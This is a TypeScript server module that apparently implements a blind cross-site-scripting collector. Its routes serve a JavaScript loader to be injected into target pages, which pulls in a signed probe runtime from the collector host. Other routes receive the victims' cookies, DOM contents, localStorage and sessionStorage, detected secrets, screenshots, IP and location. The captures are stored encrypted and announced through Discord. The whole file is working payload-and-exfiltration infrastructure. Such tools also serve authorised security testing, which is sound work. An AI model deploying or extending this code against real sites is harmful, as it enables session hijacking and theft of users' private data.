import type { Context } from 'hono';
import { Hono } from 'hono';
import { z } from 'zod';
import type { CapturedEvent, CollectorRecord, Env, EventSummary, Variables } from '../types';
import { keyedHash, packSealed, sealBytes, sealJson } from '../lib/crypto';
import {
  base64UrlToBytes,
  constantTimeEqual,
  fromUtf8,
  randomId,
  safeJsonParse,
  truncateUtf8,
  utf8,
} from '../lib/encoding';
import {
  canonicalPayloadParams,
  encodePayloadParams,
  encodeSourceLabel,
  isCollectorAlias,
  normalizeSourceLabel,
  payloadParamsFromLoaderUrl,
  sourceLabelFromLoaderUrl,
  type PayloadParam,
} from '../lib/collector-identifiers';
import { collectorOrigin, intSetting } from '../lib/http';
import { discordWebhookConfigured, sendDiscordCaptureNotification } from '../lib/discord';
import {
  createSignedRuntimeUrl,
  encodeProbeConfig,
  signedRuntimeParams,
} from '../lib/probe-runtime-config';

const app = new Hono<{ Bindings: Env; Variables: Variables }>();
type CollectorContext = Context<{ Bindings: Env; Variables: Variables }>;

interface CaptureAuthorization {
  kind: 'token' | 'alias';
  hash: string;
}

const secretSchema = z.object({
  type: z.string().max(80),
  value: z.string().max(2_048),
});

const pageSchema = z.object({
  path: z.string().max(320),
  url: z.string().max(2_048),
  status: z.number().int().min(0).max(999),
  body: z.string().max(131_072),
});

const storageEntrySchema = z.object({
  key: z.string().max(1_024),
  value: z.string().max(32_768),
});

const eventSchema = z.object({
  schemaVersion: z.literal(1),
  probeUid: z.string().min(1).max(128),
  injectionKey: z.string().max(256).default(''),
  url: z.string().max(8_192).default(''),
  origin: z.string().max(2_048).default(''),
  referrer: z.string().max(8_192).default(''),
  userAgent: z.string().max(2_048).default(''),
  title: z.string().max(1_024).default(''),
  browserTime: z.number().int().nonnegative().max(9_999_999_999_999_999).default(0),
  wasIframe: z.boolean().default(false),
  cookies: z.string().max(65_536).default(''),
  domHtml: z.string().max(524_288).default(''),
  domText: z.string().max(262_144).default(''),
  localStorage: z.array(storageEntrySchema).max(100).default([]),
  sessionStorage: z.array(storageEntrySchema).max(100).default([]),
  viewport: z.object({
    width: z.number().nonnegative().max(100_000),
    height: z.number().nonnegative().max(100_000),
    devicePixelRatio: z.number().nonnegative().max(10),
  }),
  screenshotDiagnostics: z.object({
    requested: z.boolean(),
    status: z.string().max(80),
    canvasWidth: z.number().int().nonnegative().max(100_000).optional(),
    canvasHeight: z.number().int().nonnegative().max(100_000).optional(),
    budgetBytes: z.number().int().nonnegative().max(25_000_000).optional(),
    encodedBytes: z.number().int().nonnegative().max(25_000_000).optional(),
  }).optional(),
  secrets: z.array(secretSchema).max(20).default([]),
  cors: z.union([z.string().max(512), z.literal(false)]).default(false),
  gitExposed: z.union([z.string().max(5_000), z.literal(false)]).default(false),
  pages: z.array(pageSchema).max(3).default([]),
});

const injectionSchema = z.object({
  collectorId: z.string().uuid(),
  injectionKey: z.string().min(1).max(256),
  request: z.string().min(1).max(128_000),
});

function noContent(status = 204): Response {
  return new Response(null, { status, headers: { 'Cache-Control': 'no-store' } });
}

function parsePayloadPath(pathname: string): { token: string; injectionKey: string } | null {
  const parts = pathname.split('/').filter(Boolean);
  if (parts[0] !== 'p' || parts.length < 2 || parts.length > 3) return null;
  const tokenPart = parts[1].replace(/\.js$/i, '');
  const injectionPart = (parts[2] ?? '').replace(/\.js$/i, '');
  if (!/^[A-Za-z0-9_-]{40,80}$/.test(tokenPart)) return null;
  if (injectionPart && !/^[A-Za-z0-9_.:@~-]{1,256}$/.test(injectionPart)) return null;
  return { token: tokenPart, injectionKey: injectionPart };
}

function parseAliasPath(pathname: string): { alias: string; injectionKey: string } | null {
  const parts = pathname.split('/').filter(Boolean);
  if (parts[0] !== 'a' || parts.length < 2 || parts.length > 3) return null;
  const aliasPart = parts[1].replace(/\.js$/i, '');
  const injectionPart = (parts[2] ?? '').replace(/\.js$/i, '');
  if (!isCollectorAlias(aliasPart)) return null;
  if (injectionPart && !/^[A-Za-z0-9_.:@~-]{1,256}$/.test(injectionPart)) return null;
  return { alias: aliasPart, injectionKey: injectionPart };
}

function scriptNotFound(): Response {
  return new Response('/* not found */', {
    status: 404,
    headers: {
      'Content-Type': 'application/javascript; charset=utf-8',
      'Cache-Control': 'no-store, private',
      'X-Content-Type-Options': 'nosniff',
    },
  });
}

async function collectorForTokenHash(env: Env, hash: string): Promise<CollectorRecord | null> {
  return env.DB.prepare('SELECT * FROM collectors WHERE token_hash = ? AND enabled = 1')
    .bind(hash)
    .first<CollectorRecord>();
}

async function collectorForAliasHash(env: Env, hash: string): Promise<CollectorRecord | null> {
  return env.DB.prepare(
    `SELECT c.*
       FROM collector_aliases a
       JOIN collectors c ON c.id = a.collector_id
      WHERE a.alias_hash = ? AND a.revoked_at IS NULL AND c.enabled = 1`,
  )
    .bind(hash)
    .first<CollectorRecord>();
}

async function callbackUrl(
  env: Env,
  origin: string,
  pathname: string,
  credentialHash: string,
  sourceLabel: string,
  payloadParams: PayloadParam[],
): Promise<string> {
  const callback = new URL(pathname, `${origin}/`);
  const encodedSourceLabel = sourceLabel ? encodeSourceLabel(sourceLabel) : '';
  const encodedPayloadParams = payloadParams.length > 0 ? encodePayloadParams(payloadParams) : '';
  const [sourceLabelSignature, payloadParamsSignature] = await Promise.all([
    encodedSourceLabel
      ? keyedHash(env, `source-label:${credentialHash}`, encodedSourceLabel)
      : Promise.resolve(''),
    encodedPayloadParams
      ? keyedHash(env, `payload-params:${credentialHash}`, encodedPayloadParams)
      : Promise.resolve(''),
  ]);
  if (encodedSourceLabel) {
    callback.searchParams.set('source_label', encodedSourceLabel);
    callback.searchParams.set('source_label_sig', sourceLabelSignature);
  }
  if (encodedPayloadParams) {
    callback.searchParams.set('payload_params', encodedPayloadParams);
    callback.searchParams.set('payload_params_sig', payloadParamsSignature);
  }
  return callback.toString();
}

async function loaderResponse(
  c: CollectorContext,
  collector: CollectorRecord,
  credentialHash: string,
  callbackPath: string,
  runtimePath: string,
  injectionKey: string,
): Promise<Response> {
  const origin = collectorOrigin(c.req.raw, c.env);
  const pagePaths = safeJsonParse<string[]>(collector.page_paths, [])
    .filter((path) => typeof path === 'string' && /^\/(?!\/)/.test(path))
    .slice(0, 3);
  const loaderUrl = new URL(c.req.url);
  const sourceLabel = sourceLabelFromLoaderUrl(loaderUrl);
  const payloadParams = payloadParamsFromLoaderUrl(loaderUrl);
  if (!payloadParams) return scriptNotFound();
  const probeConfig = {
    callback: await callbackUrl(c.env, origin, callbackPath, credentialHash, sourceLabel, payloadParams),
    injectionKey,
    captureCookies: collector.capture_cookies === 1,
    captureDom: collector.capture_dom === 1,
    captureScreenshot: collector.capture_screenshot === 1,
    captureStorage: collector.capture_storage === 1,
    probeChecks: collector.probe_checks === 1,
    pagePaths,
    chainloadUrl: collector.chainload_url ?? '',
    maxCaptureBytes: intSetting(c.env.MAX_CAPTURE_BYTES, 20_971_520, 65_536, 20_971_520),
  };
  const encodedConfig = encodeProbeConfig(probeConfig);
  if (!encodedConfig) return scriptNotFound();
  const signature = await keyedHash(c.env, `probe-config:${credentialHash}`, encodedConfig);
  const runtime = createSignedRuntimeUrl(
    origin,
    runtimePath,
    encodedConfig,
    signature,
    Math.floor(Date.now() / 1_000).toString(36),
  );
  if (!runtime) return scriptNotFound();
  const source = `(()=>{const d=document,s=d.createElement('script'),c=d.currentScript;s.src=${JSON.stringify(
    runtime.toString(),
  )};s.referrerPolicy='no-referrer';if(c&&c.nonce)s.nonce=c.nonce;(d.head||d.documentElement).appendChild(s)})();`;
  return new Response(source, {
    headers: {
      'Content-Type': 'application/javascript; charset=utf-8',
      'Cache-Control': 'no-store, private',
      'Access-Control-Allow-Origin': '*',
      'Cross-Origin-Resource-Policy': 'cross-origin',
      'X-Content-Type-Options': 'nosniff',
    },
  });
}

app.get('/p/*', async (c) => {
  const parsed = parsePayloadPath(new URL(c.req.url).pathname);
  if (!parsed) return scriptNotFound();
  const tokenHash = await keyedHash(c.env, 'collector-token', parsed.token);
  const collector = await collectorForTokenHash(c.env, tokenHash);
  if (!collector) return scriptNotFound();
  return loaderResponse(
    c,
    collector,
    tokenHash,
    `/c/${parsed.token}`,
    `/probe-runtime/${parsed.token}.js`,
    parsed.injectionKey,
  );
});

app.get('/a/*', async (c) => {
  const parsed = parseAliasPath(new URL(c.req.url).pathname);
  if (!parsed) return scriptNotFound();
  const aliasHash = await keyedHash(c.env, 'collector-alias', parsed.alias);
  const collector = await collectorForAliasHash(c.env, aliasHash);
  if (!collector) return scriptNotFound();
  return loaderResponse(
    c,
    collector,
    aliasHash,
    `/c/a/${parsed.alias}`,
    `/probe-runtime/a/${parsed.alias}.js`,
    parsed.injectionKey,
  );
});

async function serveSignedRuntime(
  c: CollectorContext,
  credentialHash: string,
  isActive: () => Promise<boolean>,
): Promise<Response> {
  const params = signedRuntimeParams(new URL(c.req.url));
  if (!params) return noContent(404);
  const { encodedConfig, signature } = params;
  const expectedSignature = await keyedHash(c.env, `probe-config:${credentialHash}`, encodedConfig);
  if (!constantTimeEqual(signature, expectedSignature)) return noContent(404);

  const assetUrl = new URL(c.req.url);
  assetUrl.pathname = '/probe-runtime.js';
  assetUrl.search = '';
  const [active, asset] = await Promise.all([
    isActive(),
    c.env.ASSETS.fetch(new Request(assetUrl, c.req.raw)),
  ]);
  if (!active || !asset.ok) return noContent(404);
  const headers = new Headers(asset.headers);
  headers.set('Access-Control-Allow-Origin', '*');
  headers.set('Cache-Control', 'no-store, private');
  headers.set('Content-Type', 'application/javascript; charset=utf-8');
  headers.set('Cross-Origin-Resource-Policy', 'cross-origin');
  headers.set('X-Content-Type-Options', 'nosniff');
  return new Response(asset.body, { status: 200, headers });
}

app.get('/probe-runtime/a/:aliasFile', async (c) => {
  const alias = c.req.param('aliasFile').replace(/\.js$/i, '');
  if (!isCollectorAlias(alias)) return noContent(404);
  const aliasHash = await keyedHash(c.env, 'collector-alias', alias);
  return serveSignedRuntime(c, aliasHash, async () => Boolean(await collectorForAliasHash(c.env, aliasHash)));
});

app.get('/probe-runtime/:tokenFile', async (c) => {
  const token = c.req.param('tokenFile').replace(/\.js$/i, '');
  if (!/^[A-Za-z0-9_-]{40,80}$/.test(token)) return noContent(404);
  const tokenHash = await keyedHash(c.env, 'collector-token', token);
  return serveSignedRuntime(c, tokenHash, async () => Boolean(await collectorForTokenHash(c.env, tokenHash)));
});

function captureEnvelopeError(c: CollectorContext): Response | null {
  if (c.req.header('Content-Encoding')) return noContent(415);
  const maxCaptureBytes = intSetting(c.env.MAX_CAPTURE_BYTES, 20_971_520, 65_536, 20_971_520);
  const contentLength = c.req.header('Content-Length');
  if (!contentLength || !/^\d+$/.test(contentLength)) return noContent(411);
  const length = Number.parseInt(contentLength, 10);
  if (!Number.isSafeInteger(length) || length < 1 || length > maxCaptureBytes) return noContent(413);
  return null;
}

async function verifiedSourceLabel(c: CollectorContext, credentialHash: string): Promise<string> {
  const url = new URL(c.req.url);
  const encodedValues = url.searchParams.getAll('source_label');
  const signatureValues = url.searchParams.getAll('source_label_sig');
  if (encodedValues.length === 0 && signatureValues.length === 0) return '';
  if (encodedValues.length !== 1 || signatureValues.length !== 1) return '';
  const encoded = encodedValues[0];
  const signature = signatureValues[0];
  if (!/^[A-Za-z0-9_-]{2,342}$/.test(encoded) || !/^[A-Za-z0-9_-]{43}$/.test(signature)) return '';
  const expected = await keyedHash(c.env, `source-label:${credentialHash}`, encoded);
  if (!constantTimeEqual(signature, expected)) return '';
  try {
    const label = normalizeSourceLabel(fromUtf8(base64UrlToBytes(encoded)));
    return label && encodeSourceLabel(label) === encoded ? label : '';
  } catch {
    return '';
  }
}

async function verifiedPayloadParams(c: CollectorContext, credentialHash: string): Promise<PayloadParam[]> {
  const url = new URL(c.req.url);
  const encodedValues = url.searchParams.getAll('payload_params');
  const signatureValues = url.searchParams.getAll('payload_params_sig');
  if (encodedValues.length === 0 && signatureValues.length === 0) return [];
  if (encodedValues.length !== 1 || signatureValues.length !== 1) return [];
  const encoded = encodedValues[0];
  const signature = signatureValues[0];
  if (!/^[A-Za-z0-9_-]{3,4096}$/.test(encoded) || !/^[A-Za-z0-9_-]{43}$/.test(signature)) return [];
  const expected = await keyedHash(c.env, `payload-params:${credentialHash}`, encoded);
  if (!constantTimeEqual(signature, expected)) return [];
  try {
    const decoded = safeJsonParse<unknown>(fromUtf8(base64UrlToBytes(encoded)), null);
    const params = canonicalPayloadParams(decoded);
    return params && encodePayloadParams(params) === encoded ? params : [];
  } catch {
    return [];
  }
}

async function authorizeCapture(
  c: CollectorContext,
  authorization: CaptureAuthorization,
  lookup: () => Promise<CollectorRecord | null>,
): Promise<Response> {
  const rejected = captureEnvelopeError(c);
  if (rejected) return rejected;
  const allowed = await c.env.COLLECTOR_RATE_LIMITER.limit({ key: authorization.hash });
  if (!allowed.success) return noContent(429);
  const collector = await lookup();
  if (!collector) return noContent();
  return receiveCapture(c, collector, authorization);
}

app.options('/c/a/:alias', () => noContent());
app.options('/c/:token', () => noContent());

app.post('/c/a/:alias', async (c) => {
  const alias = c.req.param('alias');
  if (!isCollectorAlias(alias)) return noContent();
  const aliasHash = await keyedHash(c.env, 'collector-alias', alias);
  return authorizeCapture(c, { kind: 'alias', hash: aliasHash }, () => collectorForAliasHash(c.env, aliasHash));
});

app.post('/c/:token', async (c) => {
  const token = c.req.param('token');
  if (!/^[A-Za-z0-9_-]{40,80}$/.test(token)) return noContent();
  const tokenHash = await keyedHash(c.env, 'collector-token', token);
  return authorizeCapture(c, { kind: 'token', hash: tokenHash }, () => collectorForTokenHash(c.env, tokenHash));
});

async function receiveCapture(
  c: CollectorContext,
  collector: CollectorRecord,
  authorization: CaptureAuthorization,
): Promise<Response> {
  const contentType = c.req.header('Content-Type') ?? '';
  if (!contentType.toLowerCase().startsWith('multipart/form-data;')) return noContent(415);

  let form: FormData;
  try {
    form = await c.req.raw.formData();
  } catch {
    return noContent(400);
  }
  const rawEvent = form.get('event');
  if (typeof rawEvent !== 'string' || utf8(rawEvent).byteLength > 20_971_520) return noContent(413);
  const parsed = eventSchema.safeParse(safeJsonParse(rawEvent, null));
  if (!parsed.success) return noContent(422);
  const event: CapturedEvent = parsed.data;
  const [sourceLabel, payloadParams] = await Promise.all([
    verifiedSourceLabel(c, authorization.hash),
    verifiedPayloadParams(c, authorization.hash),
  ]);

  if (collector.capture_cookies !== 1) event.cookies = '';
  if (collector.capture_dom !== 1) {
    event.domHtml = '';
    event.domText = '';
    event.pages = [];
    event.secrets = [];
  }
  if (collector.capture_storage !== 1) {
    event.localStorage = [];
    event.sessionStorage = [];
  }
  if (collector.probe_checks !== 1) {
    event.cors = false;
    event.gitExposed = false;
  }

  let screenshotBytes: Uint8Array | null = null;
  let screenshotMime: 'image/jpeg' | 'image/png' | null = null;
  const screenshot = form.get('screenshot');
  if (screenshot instanceof File && screenshot.size > 0) {
    screenshotBytes = new Uint8Array(await screenshot.arrayBuffer());
    if (screenshotBytes[0] === 0xff && screenshotBytes[1] === 0xd8 && screenshotBytes[2] === 0xff) {
      screenshotMime = 'image/jpeg';
    } else if (
      screenshotBytes[0] === 0x89 &&
      screenshotBytes[1] === 0x50 &&
      screenshotBytes[2] === 0x4e &&
      screenshotBytes[3] === 0x47
    ) {
      screenshotMime = 'image/png';
    } else {
      return noContent(415);
    }
  }

  const current = Math.floor(Date.now() / 1000);
  const createdDay = new Date(current * 1_000).toISOString().slice(0, 10);
  const maxEventsPerDay = intSetting(c.env.MAX_EVENTS_PER_DAY, 5_000, 1, 50_000);
  const today = await c.env.DB.prepare('SELECT COUNT(*) AS count FROM events WHERE created_day = ?')
    .bind(createdDay)
    .first<{ count: number }>();
  if (Number(today?.count ?? 0) >= maxEventsPerDay) return noContent(429);

  const eventId = randomId();
  const probeUidHash = await keyedHash(c.env, `probe-uid:${collector.id}`, event.probeUid);
  const injectionKeyHash = event.injectionKey
    ? await keyedHash(c.env, `injection:${collector.id}`, event.injectionKey)
    : null;
  const correlation = injectionKeyHash
    ? await c.env.DB.prepare(
        'SELECT id FROM injection_requests WHERE collector_id = ? AND injection_key_hash = ?',
      )
        .bind(collector.id, injectionKeyHash)
        .first<{ id: string }>()
    : null;

  const requestCf = c.req.raw.cf;
  const summary: EventSummary = {
    sourceLabel,
    payloadParams,
    url: truncateUtf8(event.url, 8_192),
    origin: truncateUtf8(event.origin, 2_048),
    title: truncateUtf8(event.title, 1_024),
    referrer: truncateUtf8(event.referrer, 4_096),
    userAgent: truncateUtf8(event.userAgent, 1_024),
    wasIframe: event.wasIframe,
    browserTime: event.browserTime,
    country: String(requestCf?.country ?? ''),
    hasScreenshot: Boolean(screenshotBytes),
    secretCount: event.secrets.length,
    storageItemCount: event.localStorage.length + event.sessionStorage.length,
    hasCorrelatedRequest: Boolean(correlation),
  };
  const detail = {
    ...event,
    sourceLabel,
    payloadParams,
    network: {
      ip: c.req.header('CF-Connecting-IP') ?? '',
      country: String(requestCf?.country ?? ''),
      city: String(requestCf?.city ?? ''),
      colo: String(requestCf?.colo ?? ''),
      asn: Number(requestCf?.asn ?? 0),
      tlsVersion: String(requestCf?.tlsVersion ?? ''),
    },
    correlatedRequestId: correlation?.id ?? null,
    serverReceivedAt: current,
  };

  const sealedSummary = await sealJson(c.env, `event:${eventId}:summary`, summary);
  const detailObject = packSealed(await sealJson(c.env, `event:${eventId}:detail`, detail));
  const sealedScreenshot = screenshotBytes
    ? packSealed(await sealBytes(c.env, `event:${eventId}:screenshot`, screenshotBytes))
    : null;
  const totalBytes = detailObject.byteLength + (sealedScreenshot?.byteLength ?? 0);
  const maxStorageBytes = intSetting(c.env.MAX_STORAGE_BYTES, 8_053_063_680, 10_485_760, 9_000_000_000);
  const reservation = await c.env.DB.prepare(
    `UPDATE app_state
        SET storage_bytes = storage_bytes + ?, event_count = event_count + 1, updated_at = ?
      WHERE id = 1 AND storage_bytes + ? <= ?
      RETURNING storage_bytes`,
  )
    .bind(totalBytes, current, totalBytes, maxStorageBytes)
    .first<{ storage_bytes: number }>();
  if (!reservation) return noContent(507);

  const detailKey = `events/${collector.id}/${eventId}/detail.bin`;
  const screenshotKey = sealedScreenshot ? `events/${collector.id}/${eventId}/screenshot.bin` : null;
  try {
    await c.env.VAULT.put(detailKey, detailObject, {
      httpMetadata: { contentType: 'application/octet-stream' },
      customMetadata: { schema: '1', kind: 'detail' },
    });
    if (sealedScreenshot && screenshotKey) {
      await c.env.VAULT.put(screenshotKey, sealedScreenshot, {
        httpMetadata: { contentType: 'application/octet-stream' },
        customMetadata: { schema: '1', kind: 'screenshot' },
      });
    }
    const authorizationCondition = authorization.kind === 'alias'
      ? `EXISTS (
           SELECT 1
             FROM collector_aliases active_alias
             JOIN collectors active_collector ON active_collector.id = active_alias.collector_id
            WHERE active_alias.alias_hash = ? AND active_alias.revoked_at IS NULL
              AND active_collector.id = ? AND active_collector.enabled = 1
         )`
      : `EXISTS (
           SELECT 1 FROM collectors active_collector
            WHERE active_collector.token_hash = ?
              AND active_collector.id = ? AND active_collector.enabled = 1
         )`;
    const inserted = await c.env.DB.prepare(
      `INSERT INTO events
        (id, collector_id, received_at, summary_ciphertext, summary_iv, detail_key,
         detail_bytes, screenshot_key, screenshot_bytes, screenshot_mime,
         probe_uid_hash, injection_key_hash, created_day)
       SELECT ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
        WHERE ${authorizationCondition}`,
    )
      .bind(
        eventId,
        collector.id,
        current,
        sealedSummary.ciphertext,
        sealedSummary.iv,
        detailKey,
        detailObject.byteLength,
        screenshotKey,
        sealedScreenshot?.byteLength ?? 0,
        screenshotMime,
        probeUidHash,
        injectionKeyHash,
        createdDay,
        authorization.hash,
        collector.id,
      )
      .run();
    if (Number(inserted.meta?.changes ?? 0) !== 1) {
      await Promise.all([
        c.env.VAULT.delete(detailKey),
        screenshotKey ? c.env.VAULT.delete(screenshotKey) : Promise.resolve(),
      ]);
      await c.env.DB.prepare(
        'UPDATE app_state SET storage_bytes = MAX(0, storage_bytes - ?), event_count = MAX(0, event_count - 1), updated_at = ? WHERE id = 1',
      )
        .bind(totalBytes, current)
        .run();
      return noContent();
    }
    if (collector.discord_notifications === 1 && discordWebhookConfigured(c.env)) {
      c.executionCtx.waitUntil(
        sendDiscordCaptureNotification(c.env, {
          eventId,
          collectorName: collector.name,
          receivedAt: current,
        }).then(() => undefined),
      );
    }
    return noContent();
  } catch {
    await Promise.all([c.env.VAULT.delete(detailKey), screenshotKey ? c.env.VAULT.delete(screenshotKey) : Promise.resolve()]);
    await c.env.DB.prepare(
      'UPDATE app_state SET storage_bytes = MAX(0, storage_bytes - ?), event_count = MAX(0, event_count - 1), updated_at = ? WHERE id = 1',
    )
      .bind(totalBytes, current)
      .run();
    return noContent(503);
  }
}

app.post('/ingest/injections', async (c) => {
  if ((c.req.header('Content-Type') ?? '').split(';', 1)[0].toLowerCase() !== 'application/json') return noContent(415);
  const contentLength = c.req.header('Content-Length');
  if (!contentLength || !/^\d+$/.test(contentLength)) return noContent(411);
  const length = Number.parseInt(contentLength, 10);
  if (!Number.isSafeInteger(length) || length < 1 || length > 140_000) return noContent(413);
  const authorization = c.req.header('Authorization') ?? '';
  const match = /^Bearer ([A-Za-z0-9_-]{40,100})$/.exec(authorization);
  if (!match) return noContent(401);
  const tokenHash = await keyedHash(c.env, 'injection-api-token', match[1]);
  const allowed = await c.env.COLLECTOR_RATE_LIMITER.limit({ key: tokenHash });
  if (!allowed.success) return noContent(429);
  const token = await c.env.DB.prepare(
    `SELECT id, user_id FROM api_tokens
      WHERE token_hash = ? AND scope = 'injection:write' AND revoked_at IS NULL`,
  )
    .bind(tokenHash)
    .first<{ id: string; user_id: string }>();
  if (!token) return noContent(401);
  const body = injectionSchema.safeParse(await c.req.json().catch(() => null));
  if (!body.success) return noContent(422);
  const collector = await c.env.DB.prepare('SELECT id FROM collectors WHERE id = ? AND user_id = ? AND enabled = 1')
    .bind(body.data.collectorId, token.user_id)
    .first<{ id: string }>();
  if (!collector) return noContent(403);
  const id = randomId();
  const injectionHash = await keyedHash(c.env, `injection:${collector.id}`, body.data.injectionKey);
  const sealed = await sealJson(c.env, `injection:${id}:request`, { request: body.data.request });
  const current = Math.floor(Date.now() / 1000);
  await c.env.DB.batch([
    c.env.DB.prepare(
      `INSERT INTO injection_requests
        (id, collector_id, injection_key_hash, request_ciphertext, request_iv, created_at)
       VALUES (?, ?, ?, ?, ?, ?)
       ON CONFLICT (collector_id, injection_key_hash) DO UPDATE SET
         id = excluded.id,
         request_ciphertext = excluded.request_ciphertext,
         request_iv = excluded.request_iv,
         created_at = excluded.created_at`,
    ).bind(id, collector.id, injectionHash, sealed.ciphertext, sealed.iv, current),
    c.env.DB.prepare('UPDATE api_tokens SET last_used_at = ? WHERE id = ?').bind(current, token.id),
  ]);
  return noContent(202);
});

export default app;
